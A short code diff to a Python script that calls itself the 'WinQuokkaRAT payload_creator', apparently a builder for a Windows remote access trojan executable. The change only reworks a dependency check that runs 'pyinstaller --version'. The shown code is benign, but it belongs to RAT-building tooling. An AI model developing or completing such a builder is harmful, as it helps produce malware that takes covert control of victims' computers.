@@ -8,11 +8,12 @@ def print_sharp(end):
         if(i==end-1):
             print()
 
-def check_dependancy(dependancy_list):
-    for dependancy_element in dependancy_list:
-        print(f"Checking if it is installed... : {dependancy_element}")
+def check_dependancy(dependancy_dict):
+    for key in dependancy_dict:
+        print(f"Checking if it is installed... : {key}")
         try:
-            result = subprocess.check_call(f"{dependancy_element}")
+            result = subprocess.run(f"{dependancy_dict[key]}",capture_output=True)
+            print(f"{key} is already instelled...")
 
         except Exception as e:
             print(f"dependancy doesn't installed : {e}")
@@ -22,7 +23,7 @@ print_sharp(50)
 print("hello, its WinQuokkaRAT payload_creator")
 print("creating winQuokkaRAT payload exe...")
 
-dependancy_list= {"pyinstaller --version"}
-check_dependancy(dependancy_list)
+dependancy_dict= {"pyinstaller":"pyinstaller --version"}
+check_dependancy(dependancy_dict)
 
 
